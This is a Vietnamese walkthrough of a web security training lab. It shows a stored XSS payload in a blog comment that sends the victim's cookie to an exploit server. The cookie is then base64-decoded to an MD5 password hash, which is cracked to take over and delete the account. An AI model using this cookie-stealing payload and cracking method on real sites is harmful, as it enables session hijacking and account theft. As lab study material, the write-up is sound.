# Lab: Offline password cracking

# 1. Vulnerable

Ở bài lab này, ta được cung cấp account cá nhân cũng như `victim's username`

Ở đây không được cung cấp list password như các lab khác nhưng lại xuất hiện lỗ hổng `XSS`

Lợi dụng `XSS` để chiếm cookie của `victim` để đăng nhập

# 2. Exploit

Ở phần post comment có `stored XSS` 

![vuln0.png](/images/vuln0.png)

Ở đây ta sẽ có 1 trang exploit

![vuln1.png](/images/vuln1.png)

Trang web này có ghi lại các lần truy cập vào file log mà ta có thể đọc được

![vuln2.png](/images/vuln2.png)

Ta sẽ có kịch bản khai thác như sau:

Lợi dụng `stored XSS` khiến victim bị chuyển truy cập vào link `exploit + cookie` và từ đó đăng nhập vào `victim's account`

Payload:

```
<script> document.location='exploit-url/' + document.cookie </script>
```

Sau khi `victim` đã bị XSS thì ta sẽ check file log và nhận được `cookie` 

![vuln3.png](/images/vuln3.png)

Sau khi đã lấy được `cookie` và đăng nhập vào `victim's account` thì ta sẽ giải mã `cookie` như sau:

```
base64-decode(carlos:md5(password)) (do đoạn hash có độ dài 32 ký tự là mặc định của hash md5)
```

![vuln4.png](/images/vuln4.png)

Ok decode đoạn hash của phần password và ta được

![vuln5.png](/images/vuln5.png)

Việc còn lại là xóa `victim's account` bằng mật khẩu đã decode được

![solved.png](/images/solved.png)